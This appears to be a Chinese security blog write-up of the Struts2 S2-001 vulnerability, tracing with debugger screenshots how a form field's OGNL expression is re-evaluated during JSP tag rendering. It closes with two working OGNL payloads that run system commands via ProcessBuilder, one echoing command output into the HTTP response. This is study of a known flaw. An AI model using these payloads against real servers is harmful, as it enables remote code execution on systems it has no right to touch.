# JavaStruts2系列-S2-001

  
  
&lt;!--more--&gt;  
## 0x01 S2-001漏洞复现  
### 漏洞影响范围  
WebWork 2.1 (with altSyntax enabled)    
WebWork 2.2.0 - WebWork 2.2.5    
Struts 2.0.0 - Struts 2.0.8  
Struts2对 OGNL 表达式的解析使用了开源组件`opensymphony.xwork. 2.0.3`所以会有漏洞  
### 流程分析  
在`org.apache.struts2.dispatcher.FilterDispatcher`下，在这一个类的`doFilter()`方法中做了如下业务  
设置编码和本地化信息  
创建`ActionContext`对象  
分配当前线程的分发器  
将request对象进行封装  
获取 ActionMapping 对象，ActionMapping 对象对应一个 action 详细配置信息  
执行 Action 请求，也就是 172 行的`serviceAction()`方法  
先在 Filter 的`doFilter()`方法下个断点，开始调试  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png)
首先获取当前请求是否已经有`ValueStack`对象，这样做的目的是在接收到 chain 跳转方式的请求时，可以直接接管上次请求的 action。如果没有 ValueStack 对象，获取当前线程的 ActionContext 对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中，获取 ActionMapping 中配置的 namespace，name，method 值  
在`187`行这里，跟进`serviceAction()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png)
通过`ActionProxyFactory`的`createActionProxy()`类初始化一个`ActionProxy`，在这过程中也会创建`StrutsActionProxy`的实例。`StrutsActionProxy`是继承自`com.opensymphony.xwork2.DefaultActionProxy`的，在这个代理对象内部实际上就持有了`DefaultActionInvocation`的一个实例  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png)
`DefaultActionInvocation`对象中保存了`Action`调用过程中需要的一切信息，继续往下走，跟进`proxy.execute()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png)
获取到了上下文环境，并且调用`setter`方式赋值上下文，接着继续跟进`invoke()`方法  
在`invoke()`方法中，首先会顺序的递归执行当前`Action`中所配置的所有的拦截器，知道拦截器遍历完毕调用真正的`Action`，此处是一个`interceptor`迭代器再进行遍历操作，对应遍历的内容是`struts2`包内的`struts-default.xml`里面`interceptors`标签中的内容  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png)
在众多迭代器中，`param`这一个迭代器使用来处理我们输入的参数的，所以会想到，会不会对应的迭代器里就有所谓的 OGNL 表达式的处理呢？跟进去查看一下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png)
这段的大致意思就是，最开始在登陆框中的`username`和`password`会被保存到stack 里面，通过`ActionContext.getParameters()`方法将`stack`里面的值拿出来，再通过`ValueStack.setValue(String,Object)`方法把值`set`进去  
接着在后文，它表明了这个类能够处理 OGNL 表达式，并且已经考虑了安全性问题  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png)
而此处的迭代器调用栈如下  
```java  
intercept:155, ServletConfigInterceptor (org.apache.struts2.interceptor)  
doProfiling:224, DefaultActionInvocation$2 (com.opensymphony.xwork2)  
doProfiling:223, DefaultActionInvocation$2 (com.opensymphony.xwork2)  
profile:455, UtilTimerStack (com.opensymphony.xwork2.util.profiling)  
invoke:221, DefaultActionInvocation (com.opensymphony.xwork2)  
intercept:123, AliasInterceptor (com.opensymphony.xwork2.interceptor)  
doProfiling:224, DefaultActionInvocation$2 (com.opensymphony.xwork2)  
doProfiling:223, DefaultActionInvocation$2 (com.opensymphony.xwork2)  
profile:455, UtilTimerStack (com.opensymphony.xwork2.util.profiling)  
invoke:221, DefaultActionInvocation (com.opensymphony.xwork2)  
intercept:176, ExceptionMappingInterceptor (com.opensymphony.xwork2.interceptor)  
doProfiling:224, DefaultActionInvocation$2 (com.opensymphony.xwork2)  
doProfiling:223, DefaultActionInvocation$2 (com.opensymphony.xwork2)  
profile:455, UtilTimerStack (com.opensymphony.xwork2.util.profiling)  
invoke:221, DefaultActionInvocation (com.opensymphony.xwork2)  
execute:50, StrutsActionProxy (org.apache.struts2.impl)  
serviceAction:504, Dispatcher (org.apache.struts2.dispatcher)  
doFilter:419, FilterDispatcher (org.apache.struts2.dispatcher)  
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)  
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)  
```  
在一个类中进行了对应的迭代器判断  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png)
一直到迭代器为`params`为止，跟进。跟进之后会到`ParameterInterceptor.doIntercept()`方法处  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png)
跟进到`setParameters()`方法里面，再从这里面进`setValue()`方法，为什么要跟进`setValue()`方法？因为上面的注释中写到了，OGNL 的语句会被送到`OgnlValueStack#setValue`处进行处理  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png)
一直跟进  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png)
经历了一系列的迭代器之后，所有迭代器处理完毕了，执行了`invokeActionOnly()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png)
通过反射调用执行了`action`实现类里的`execute`方法，开始处理用户的逻辑信息。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png)
处理完毕用户的逻辑信息之后，我们继续往下走，跟进`executeResult()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png)
首先`createResult()`这里创建了一个`Result`对象，对应的方法`com.opensymphony.xwork2.DefaultActionInvocation#createResult`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png)
如果当时调用了`Action`返回了`Result`对象，则直接返回；否则，通过`proxy`对象获取配置信息，根据 resultCode 获取到`Result`对象。  
继续往下走，`executeResult()`方法中调用了`execute()`方法；跟进`doExecute()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png)
准备执行环境: `request, pageContext`等等后，发送真正的响应信息，可以看到我们自己配置时候返回结果是 `jsp` 文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png)
之后调用了`JspServlet`来处理请求，在解析标签的时候，在标签的开始和结束位置，会分别调用对应实现类如`org.apache.struts2.views.jsp.ComponentTagSupport`中的`doStartTag()`及`doEndTag()`，这里会调用组件`org.apache.struts2.components.UIBean`的`end()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png)
跟进`evaluateParams()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png)
由于`altSyntax`默认开启了，接下来会调用`findValue()`方法寻找参数值  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png)
继续跟进`translateVariables()`方法  
最终触发点是`TextParseUtil#translateVariables`，在此处下了断点之后，可以看到依次进入了好几次，不同时候的`expression`的值都会有所不同，我们找到值为`password`时开始分析。  
经过两次如下的代码之后，将生成 OGNL 表达式，返回了`%{password}`  
```java  
return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);  
```  
然后这次判断不会直接走到`return`，来到后面，取出`%{password}`中间的值`password`赋值给`var`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png)
然后通过`Object o = stack.findValue(var,asType)`获得到`password`的值为`%{1&#43;1}`  
然后重新赋值给 expression，进行下一次循环  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png)
在这一次循环的时候，就再次解析了`%{1&#43;1}`这个`OGNL`表达式，并将其赋值给了`o`  
最后`expression`的值就变成了2，不是 OGNL 表达式时就会直接进入  
```java  
return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);  
```  
最后返回并显示在表达那种，这是含有 OGNL 表达式的处理，比正常的处理多了OGNL这一部分，所以 Struts2 的运行流程到此结束。  
### 漏洞利用  
exp  
```java  
%{(new java.lang.ProcessBuilder(new java.lang.String[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})).start()}  
```  
或者  
```java  
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&#34;bash&#34;,&#34;-c&#34;,&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  
```  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/javastruts2%E7%B3%BB%E5%88%97-s2-001/  

